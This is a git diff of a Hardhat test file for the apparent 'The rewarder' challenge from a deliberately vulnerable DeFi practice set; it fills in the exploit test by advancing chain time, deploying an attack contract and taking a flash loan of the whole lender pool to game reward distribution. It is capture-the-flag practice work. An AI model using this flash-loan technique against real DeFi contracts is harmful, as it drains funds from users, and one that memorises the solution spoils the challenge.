@@ -14,6 +14,11 @@ describe('[Challenge] The rewarder', function () {
         [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
         users = [alice, bob, charlie, david];
 
+        for (let i = 0; i < users.length; i++) {
+            console.log(i+1, ":", users[i].address);
+        }
+        console.log("Attacker:", attacker.address, '\n');
+
         const FlashLoanerPoolFactory = await ethers.getContractFactory('FlashLoanerPool', deployer);
         const TheRewarderPoolFactory = await ethers.getContractFactory('TheRewarderPool', deployer);
         const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
@@ -66,6 +71,26 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);
+        
+        AttackRewarder = await ethers.getContractFactory('AttackRewarder', attacker);
+        attackContract = await AttackRewarder.deploy(
+            this.flashLoanPool.address, 
+            this.liquidityToken.address,
+            this.rewarderPool.address,
+            this.rewardToken.address
+        );    
+
+        let ZERO = ethers.utils.parseEther('0');
+        // let txn = await attackContract.executeFlashloan(ZERO);
+        let txn = await attackContract.executeFlashloan(TOKENS_IN_LENDER_POOL);
+
+        // console.log(
+        //     parseInt(txn.gasLimit._hex, 16)
+        // )
+
+        // await this.rewarderPool.connect(attacker).distributeRewards();
     });
 
     after(async function () {
